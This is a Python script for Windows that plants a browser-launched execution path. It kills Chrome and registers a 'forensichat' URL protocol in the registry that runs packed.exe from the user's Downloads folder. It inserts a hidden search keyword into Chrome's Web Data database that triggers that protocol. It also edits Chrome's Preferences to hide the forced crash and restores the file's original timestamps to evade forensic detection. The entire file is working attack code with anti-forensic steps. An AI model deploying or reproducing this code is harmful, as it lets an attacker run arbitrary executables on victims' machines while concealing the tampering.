import _winreg as wreg
import getpass
import os
import sqlite3 as lite

#add custum url header to registry
def reghead():
	user = getpass.getuser()
	key = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT, '')
	wreg.SetValue(key,'forensichat',wreg.REG_SZ,'URL:forensichat Protocol')
	kkey = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT, 'forensichat')
	wreg.SetValueEx(kkey, 'URL Protocol', 0, wreg.REG_SZ,'')
	wreg.CreateKey(wreg.HKEY_CLASSES_ROOT,"forensichat\shell")
	nkey = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT,"forensichat\shell\open")
	wreg.SetValue(nkey,"command",wreg.REG_SZ,'C:\Users\\'+user+'\Downloads\\packed.exe')
	key.Close()
	nkey.Close()
	kkey.Close()

#shutdown chrome
def killchrome():
	os.system("taskkill /F /IM chrome.exe")
	user = getpass.getuser()
	replacements = {'Crashed':'Normal'}

	p = 'C:\Users\\'+user+'\AppData\Local\Google\Chrome\User Data\Default\Preferences'

	a,m = get_a_m(p)	

	lines = []
	with open(p) as infile:
	    for line in infile:
	        for src, target in replacements.iteritems():
	            line = line.replace(src, target)
	        lines.append(line)
	with open(p, 'w') as outfile:
	    for line in lines:
	    	outfile.write(line)


	change_a_m(a,m,p)

#start sql stuff
def addcustombrowser():
	user = getpass.getuser()
	con = lite.connect('C:\Users\\'+user+'\AppData\Local\Google\Chrome\User Data\Default\Web Data')
	c = con.cursor()
	#idmax = c.execute('SELECT MAX(id) FROM keywords')
	#c.execute("INSERT INTO keywords  VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','','forensichat://C:>Windows>System32>calc.exe',0,'',0,0,'',0,'',0,0,'',0,'','','','','','','','','')")
	c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
	foo = c.fetchall()
	if foo == []:
		c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://','')")
		con.commit()
	con.close()
	# prints (u'testvalue', 1)

#daltons chrome kill stuff
def get_a_m(p):

	s = os.stat(p)
	a = s.st_atime
	m = s.st_mtime

	return a,m

def change_a_m(a,m,p):

	os.utime(p,(a, m))

def main():
	killchrome()
	reghead()
	addcustombrowser()

if __name__ == "__main__": main()